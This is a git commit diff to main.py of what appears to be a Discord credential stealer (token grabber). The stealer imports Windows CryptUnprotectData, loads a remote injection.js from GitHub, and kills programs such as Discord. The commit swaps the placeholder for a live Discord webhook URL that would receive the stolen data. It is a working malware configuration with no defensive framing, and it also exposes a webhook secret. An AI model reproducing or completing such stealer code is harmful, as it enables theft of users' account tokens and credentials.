20934db6eb4a3dd18c4d0d619d0c9ff945161351
NewReyRJ <105505038+NewReyRJ@users.noreply.github.com>
2022-06-09 20:52:50 -0400

    Update main.py

--- main.py
+++ main.py
@@ -23,9 +23,9 @@ from win32crypt import CryptUnprotectData
 config = {
     # replace WEBHOOK_HERE with your webhook ↓↓ or use the api from https://github.com/Rdimo/Discord-Webhook-Protector
     # Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-    'webhook': "WEBHOOK_HERE",
+    'webhook': "https://discord.com/api/webhooks/984619822480506971/VsPY-uZ8Wf3dSkuKJnNlZ9u80kU1ePzqmQRZT8RlGb-80MJlZ_EBpOMDKETRpAksUUaC",
     # ONLY HAVE THE BASE32 ENCODED KEY HERE IF YOU'RE USING https://github.com/Rdimo/Discord-Webhook-Protector
-    'webhook_protector_key': "KEY_HERE",
+    'webhook_protector_key': "print(NITRO HERE)",
     # keep it as it is unless you want to have a custom one
     'injection_url': "https://raw.githubusercontent.com/Rdimo/Discord-Injection/master/injection.js",
     # set to False if you don't want it to kill programs such as discord upon running the exe
